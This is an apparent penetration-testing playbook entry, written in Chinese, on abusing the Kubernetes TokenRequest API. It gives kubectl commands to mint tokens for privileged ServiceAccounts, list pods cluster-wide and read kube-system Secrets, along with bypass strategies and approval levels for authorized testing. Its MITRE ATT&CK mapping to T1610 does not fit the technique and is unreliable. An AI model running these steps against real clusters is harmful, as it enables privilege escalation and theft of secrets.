---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.12]
mapped_compliance_families: [RBAC, SA token]
---

# tokenrequest-api-abuse — TokenRequest API 滥用

攻击者持有 `serviceaccounts/token` 的 `create` 权限，可通过 TokenRequest API 为任意 ServiceAccount 生成短期 token，冒充高权限 SA（如 `default` 或自定义特权 SA）执行集群操作，实现权限提升。

---

## 1. 前置条件

- 当前身份（用户或 SA）被授予 `serviceaccounts/token` 的 `create` 权限
- 集群中存在高权限 ServiceAccount 可作为冒充目标
- TokenRequest API 可用（Kubernetes ≥ 1.24 默认启用）

检查命令：
```bash
# [L0] 探测：检查是否有 token 创建权限
kubectl auth can-i create serviceaccounts/token
# 期望输出: yes

# [L0] 探测：列出可用的高权限 SA
kubectl get sa -A -o wide | grep -v Kubernetes
# 期望输出: 集群内 SA 列表（识别特权 SA）
```

## 2. 探测命令

```bash
# [L0] 探测：确认可对哪些 SA 创建 token
kubectl auth can-i create serviceaccounts/token -n <ns> --as <current-identity>

# [L0] 探测：识别高权限 SA
kubectl get sa -A | awk '{print $2, $1}' | head
# 期望输出: SA 名与命名空间

# [L0] 探测：检查目标 SA 的绑定 Role/ClusterRole
kubectl get clusterrolebinding -o jsonpath='{range .items[*]}{@.metadata.name}{": "}{@.subjects[*].name}{"\n"}{end}' | grep -i <target-sa>
# 期望输出: 目标 SA 绑定的 ClusterRole（如 cluster-admin）
```

## 3. 攻击验证

```bash
# [L2] 攻击验证：为目标 SA 生成 24h token
kubectl create token <target-sa> -n <ns> --duration=24h
# 期望输出: eyJ...（JWT token 字符串）

# [L2] 攻击验证：用生成的 token 执行特权操作
kubectl --token=<generated-token> get pods --all-namespaces
# 期望输出: 集群所有 Pod 列表（目标 SA 权限内）

# [L2] 攻击验证：用 token 读取敏感 Secret
kubectl --token=<generated-token> get secret -n kube-system
# 期望输出: kube-system Secret 列表（若 SA 高权限）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：当前身份权限受限
kubectl auth can-i get pods --all-namespaces
# 期望输出: no

# [L0] 攻击后环境对比：用生成 token 后获得特权
kubectl --token=<generated-token> auth can-i get pods --all-namespaces
# 期望输出: yes → 证明通过 TokenRequest 提权成功
```

差分结论：攻击前当前身份无法 `get pods --all-namespaces`，通过 TokenRequest 为高权限 SA 生成 token 后获得 `yes`，证明权限提升成功。

## 5. 绕过策略

```bash
# [L0] 检查 RBAC 是否限制 token 创建
kubectl auth can-i create serviceaccounts/token
# 若 no → 无法滥用

# 绕过方式：
# - [L2] 若仅对特定命名空间 SA 有 create token 权限，优先攻击该命名空间内特权 SA
# - [L2] 若 token 有 audience 限制，使用 --audience 指定有效 audience
# - [L2] 若 BoundServiceAccountToken 限制绑定 Pod，模拟合法 Pod 身份请求
```

## 6. 证伪条件

```bash
# [L0] 无 token 创建权限
kubectl auth can-i create serviceaccounts/token
# 输出: no → 证伪

# [L2] 生成 token 失败
kubectl create token <target-sa> 2>&1
# 输出: forbidden 或 cannot create token → 证伪

# [L2] 生成的 token 无效
kubectl --token=<generated-token> get pods 2>&1
# 输出: Unauthorized → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（为任意 SA 生成 token 并冒用）→ **Level 4**（权限提升，需人工确认）
- **L1** 探测命令（auth can-i）→ **Level 2**（只读探测，自动执行）
- **L0** 观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Privilege Escalation / Defense Evasion
- **Technique ID**: T1610
- **Technique Name**: Deploy Container
- **描述**: 攻击者持有 `serviceaccounts/token` 的 `create` 权限，通过 TokenRequest API 为任意高权限 ServiceAccount 生成短期 token，冒充该 SA 执行集群操作，实现权限提升。